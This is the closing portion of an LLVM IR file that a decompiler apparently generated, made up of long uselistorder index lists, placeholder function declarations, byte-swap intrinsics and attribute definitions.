1555, 1556, 1557, 42, 1558, 1559, 1560, 1561, 1562, 43, 1563, 1564, 1565, 1566, 1567, 1568, 1569, 1570, 1571, 1572, 1573, 1574, 1575, 1576, 1577, 197, 805, 637, 806, 807, 808, 809, 843, 444, 445, 844, 845, 142, 143, 144, 201, 810, 199, 811, 832, 825, 638, 826, 827, 828, 829, 48, 49, 94, 830, 831, 350, 833, 834, 639, 835, 198, 836, 50, 51, 93, 837, 838, 640, 839, 840, 52, 53, 92, 841, 200, 842, 145, 812, 641, 813, 814, 446, 815, 816, 642, 817, 818, 821, 819, 820, 351, 822, 54, 55, 96, 823, 643, 56, 57, 95, 824, 846, 644, 847, 848, 849, 850, 851, 852, 645, 853, 854, 855, 856, 736, 735, 354, 738, 739, 737, 352, 353, 740, 741, 447, 742, 744, 745, 646, 746, 747, 748, 647, 749, 750, 58, 59, 97, 751, 752, 753, 82, 83, 754, 755, 756, 202, 757, 758, 759, 760, 761, 448, 762, 763, 764, 765, 766, 767, 146, 770, 648, 771, 772, 60, 61, 99, 773, 774, 775, 649, 776, 777, 778, 779, 650, 780, 781, 62, 63, 98, 782, 783, 784, 785, 786, 203, 205, 768, 204, 769, 206, 787, 147, 857, 862, 863, 858, 859, 860, 865, 866, 867, 207, 868, 869, 870, 871, 872, 861, 864, 873, 148, 878, 879, 880, 449, 967, 450, 881, 1452, 1453, 1454, 208, 1455, 1170, 1169, 1171, 1123, 1172, 883, 882, 884, 968, 969, 970, 1578, 1579, 1580, 1581, 209, 1582, 1583, 1584, 1173, 1174, 371, 372, 451, 1589, 654, 1590, 452, 1591, 1592, 453, 1593, 1594, 652, 210, 356, 1595, 653, 1596, 454, 84, 1597, 1598, 455, 1613, 1614, 1617, 651, 355, 1618, 410, 150, 149, 1615, 1616, 1585, 1586, 655, 211, 332, 724, 13, 14, 1609, 1004, 887, 1608, 1175, 151, 1176, 119, 213, 1177, 656, 212, 1178, 1179, 1599, 1600, 1601, 1602, 456, 1603, 152, 888, 889, 64, 65, 100, 1124, 1125, 89, 358, 1129, 1126, 1127, 657, 1128, 1130, 658, 1131, 1132, 1133, 1134, 66, 67, 101, 1135, 214, 1136, 1137, 1138, 1140, 1139, 357, 725, 727, 726, 215, 728, 729, 730, 457, 731, 153, 1587, 1588, 154, 459, 460, 1604, 458, 155, 156, 1185, 1186, 1187, 1188, 1189, 216, 1190, 1191, 1192, 1193, 1194, 1195, 217, 1180, 461, 1181, 1182, 462, 1183, 1184, 157, 1141, 463, 218, 1142, 1143, 1144, 1145, 1146, 158, 227, 225, 226, 224, 219, 221, 220, 222, 228, 223, 1196, 1197, 1221, 1222, 159, 1198, 1199, 232, 230, 231, 1200, 1201, 238, 237, 168, 229, 1202, 1203, 1204, 1205, 1206, 1207, 378, 377, 411, 464, 1208, 1209, 1210, 85, 1211, 234, 233, 235, 236, 167, 1212, 1213, 359, 1214, 1215, 127, 1216, 1217, 1218, 1219, 1220, 15, 16, 890, 891, 86, 17, 412, 465, 1223, 1224, 1107, 1106, 1226, 1225, 1078, 1077, 1228, 1227, 960, 1229, 892, 1231, 1230, 1037, 894, 893, 1166, 1619, 1620, 102, 160, 971, 972, 973, 239, 885, 886, 240, 974, 979, 980, 981, 982, 241, 975, 242, 976, 977, 18, 243, 983, 466, 1232, 1605, 1606, 1607, 895, 1234, 1233, 984, 896, 1003, 897, 898, 899, 1610, 1611, 1612, 978, 19, 1235, 1236, 1237, 1238, 124, 1239, 244, 1240, 1241, 1242, 1243, 1244, 1245, 1246, 245, 659, 662, 660, 661, 1247, 1248, 1249, 1250, 1251, 1252, 20, 1456, 1457, 1458, 125, 1459, 1460, 1461, 1462, 1463, 246, 1464, 663, 666, 664, 665, 1465, 667, 169, 247, 1253, 1254, 120, 369, 1255, 1256, 68, 161, 668, 360, 22, 21, 248, 1257, 249, 669, 23, 361, 250, 251, 252, 69, 253, 467, 900, 985, 986, 987, 1259, 1258, 1260, 1261, 1262, 1263, 44, 254, 1264, 1265, 1266, 255, 114, 115, 468, 422, 423, 1267, 257, 256, 258, 1268, 259, 1269, 1270, 260, 1147, 1148, 469, 261, 262, 263, 1271, 264, 1272, 265, 266, 901, 267, 902, 903, 904, 908, 704, 712, 713, 715, 700, 116, 70, 335, 336, 701, 714, 702, 674, 703, 705, 675, 706, 676, 707, 677, 708, 678, 709, 679, 710, 680, 711, 716, 717, 470, 718, 126, 905, 670, 906, 471, 907, 363, 362, 909, 910, 911, 912, 269, 268, 913, 914, 915, 681, 333, 916, 105, 106, 334, 917, 103, 104, 472, 919, 920, 671, 921, 922, 923, 924, 925, 473, 926, 927, 928, 170, 673, 929, 930, 931, 672, 932, 933, 474, 934, 935, 938, 939, 940, 270, 936, 271, 937, 272, 918, 1108, 1109, 941, 475, 942, 944, 273, 945, 946, 947, 948, 949, 950, 951, 275, 274, 952, 476, 953, 477, 954, 478, 943, 955, 379, 958, 479, 959, 480, 956, 957, 481, 962, 682, 278, 277, 276, 365, 482, 961, 364, 963, 964, 965, 71, 966, 279, 483, 121, 988, 989, 990, 991, 368, 992, 993, 994, 367, 995, 996, 997, 998, 280, 999, 1001, 1000, 162, 163, 281, 366, 283, 282, 1002, 284, 285, 87, 286, 1005, 1006, 128, 129, 88, 1007, 287, 288, 337, 1008, 290, 1009, 291, 289, 484, 1010, 1011, 1013, 1012, 1014, 292, 1015, 1016, 413, 1017, 1018, 1019, 293, 294, 1020, 295, 1021, 296, 1022, 297, 1023, 1024, 117, 1025, 1026, 298, 1027, 1028, 1029, 299, 1031, 300, 338, 1032, 1030, 1033, 1034, 1035, 301, 1036, 1038, 303, 1040, 1041, 302, 1039, 1042, 164, 486, 487, 1043, 1044, 488, 489, 1045, 485, 1046, 1047, 304, 1048, 1049, 305, 306, 1050, 1051, 165, 1052, 1053, 24, 25, 26, 27, 1054, 1055, 307, 415, 1056, 1057, 490, 1058, 491, 1059, 492, 1060, 493, 1061, 494, 1062, 495, 1063, 414, 1064, 496, 1065, 1066, 1067, 308, 1069, 1070, 309, 339, 1071, 1068, 1072, 1073, 1074, 28, 29, 30, 1075, 310, 1076, 1079, 1080, 72, 1081, 311, 1082, 1083, 312, 340, 1085, 1084, 497, 1086, 1088, 1089, 1090, 1091, 498, 1092, 31, 32, 33, 1087, 34, 35, 1093, 313, 1094, 1095, 314, 1098, 1099, 1100, 341, 1101, 1096, 1097, 1103, 1102, 1104, 315, 1105, 1110, 1111, 316, 1113, 1114, 1115, 317, 499, 1117, 1116, 1112, 1119, 1120, 1118, 1121, 318, 1122, 380, 1149, 502, 1150, 73, 1151, 130, 1152, 1153, 1154, 381, 1155, 503, 1156, 1157, 1158, 45, 370, 1159, 1160, 1273, 319, 1274, 1167, 320, 1168, 321, 1275, 719, 720, 721, 722, 1276, 723, 1277, 1278, 1279, 1280, 322, 323, 1281, 1282, 684, 685, 686, 1283, 1284, 1285, 1286, 1287, 1288, 1289, 1290, 1291, 1292, 1293, 1294, 1295, 692, 1296, 1297, 1298, 1299, 1300, 508, 1301, 1302, 693, 1303, 1304, 1305, 687, 1306, 688, 324, 325, 1307, 1308, 1309, 1310, 694, 1311, 1312, 166, 1313, 1314, 695, 1315, 326, 1316, 1317, 1318, 696, 504, 505, 1319, 1320, 697, 1321, 1322, 1323, 1324, 1325, 1326, 1327, 1328, 1329, 506, 1335, 1330, 1331, 1332, 1333, 698, 1334, 699, 1336, 507, 1337, 1338, 1339, 1340, 1341, 1342, 689, 1344, 1345, 1346, 1347, 1348, 382, 1349, 1352, 1353, 1350, 1351, 328, 327, 1354, 1355, 1356, 1357, 500, 501, 329, 1358, 1359, 342, 1360, 107, 108, 343, 1361, 109, 110, 509, 1362, 1343, 1363, 635, 683, 690, 691, 1364, 1365, 1366, 1367, 1368, 1369, 416, 1370, 417, 1371, 418, 1372, 1621, 419, 732, 420, 421, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 1622, 1623, 1624, 1625, 1626, 1627, 1628, 1629, 1630, 1631, 1632, 1633, 1634, 1635, 1636 }
  uselistorder i32* @r4, { 105, 918, 919, 920, 921, 922, 940, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 9, 937, 938, 939, 941, 942, 943, 944, 945, 946, 947, 948, 112, 113, 114, 115, 158, 10, 159, 160, 161, 11, 162, 163, 164, 165, 166, 167, 168, 0, 12, 169, 170, 171, 172, 173, 174, 175, 176, 235, 236, 949, 106, 107, 108, 65, 951, 952, 953, 3, 956, 66, 950, 727, 728, 116, 117, 118, 119, 120, 121, 122, 123, 124, 957, 958, 177, 178, 13, 2, 179, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 14, 180, 181, 182, 183, 184, 185, 186, 187, 206, 15, 207, 208, 188, 189, 191, 16, 192, 195, 17, 196, 197, 18, 198, 199, 19, 200, 201, 20, 202, 203, 21, 204, 56, 205, 190, 209, 22, 210, 211, 212, 213, 214, 215, 216, 193, 194, 109, 110, 111, 125, 126, 127, 128, 23, 129, 24, 25, 130, 131, 132, 133, 134, 135, 136, 141, 142, 26, 143, 144, 27, 145, 146, 28, 147, 148, 29, 149, 150, 30, 151, 152, 31, 153, 154, 137, 138, 139, 140, 155, 156, 157, 217, 218, 219, 32, 220, 221, 222, 33, 223, 224, 225, 226, 227, 228, 52, 229, 230, 231, 232, 233, 234, 237, 238, 239, 240, 378, 241, 954, 955, 732, 733, 734, 735, 736, 737, 660, 661, 379, 380, 975, 976, 977, 738, 739, 64, 980, 53, 981, 982, 983, 999, 1001, 1002, 1003, 1000, 984, 989, 997, 998, 978, 990, 991, 992, 993, 67, 68, 69, 740, 741, 4, 34, 742, 35, 743, 744, 745, 985, 986, 662, 97, 98, 99, 100, 101, 102, 979, 987, 988, 242, 243, 244, 245, 746, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 36, 762, 763, 764, 765, 747, 748, 749, 663, 664, 665, 666, 667, 668, 669, 670, 671, 37, 672, 673, 674, 675, 676, 677, 678, 679, 680, 766, 788, 789, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 57, 780, 781, 1, 782, 783, 784, 785, 786, 787, 249, 250, 251, 70, 790, 791, 625, 626, 627, 630, 631, 632, 628, 629, 792, 793, 794, 795, 796, 797, 798, 71, 568, 569, 570, 573, 574, 575, 571, 572, 799, 800, 801, 802, 803, 804, 805, 806, 807, 72, 808, 809, 810, 811, 812, 813, 814, 252, 253, 254, 255, 256, 257, 258, 381, 382, 383, 384, 385, 386, 387, 246, 247, 248, 388, 389, 390, 391, 8, 392, 393, 394, 395, 396, 397, 398, 815, 816, 817, 820, 821, 822, 818, 819, 259, 260, 261, 262, 263, 264, 994, 995, 996, 265, 266, 267, 399, 400, 401, 402, 403, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 823, 824, 825, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 302, 303, 304, 305, 95, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 96, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 324, 325, 326, 327, 328, 335, 336, 337, 338, 339, 340, 5, 329, 330, 331, 332, 333, 334, 320, 321, 322, 323, 633, 634, 635, 636, 637, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 360, 361, 362, 363, 364, 365, 354, 355, 356, 357, 358, 359, 103, 366, 367, 368, 369, 55, 371, 370, 54, 372, 373, 374, 375, 376, 6, 377, 404, 38, 7, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 430, 424, 425, 426, 427, 428, 429, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 39, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 40, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 41, 503, 42, 504, 43, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 44, 531, 45, 532, 46, 533, 47, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 48, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 638, 639, 640, 641, 49, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 719, 716, 717, 718, 720, 721, 722, 723, 724, 725, 726, 826, 827, 729, 730, 731, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 50, 857, 58, 858, 859, 63, 860, 862, 863, 864, 62, 861, 51, 865, 866, 867, 868, 869, 870, 871, 61, 872, 873, 874, 60, 875, 876, 877, 59, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 104, 917 }
}

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i16 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i16* @__decompiler_undefined_function_3() local_unnamed_addr

declare i8 @__decompiler_undefined_function_4() local_unnamed_addr

declare %vfp_regs @__decompiler_undefined_function_5() local_unnamed_addr

declare %anon_struct_4 @__decompiler_undefined_function_6() local_unnamed_addr

declare %anon_struct_13.3 @__decompiler_undefined_function_7() local_unnamed_addr

declare %anon_struct_13 @__decompiler_undefined_function_8() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

; Function Attrs: nounwind readnone
declare i16 @llvm.bswap.i16(i16) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
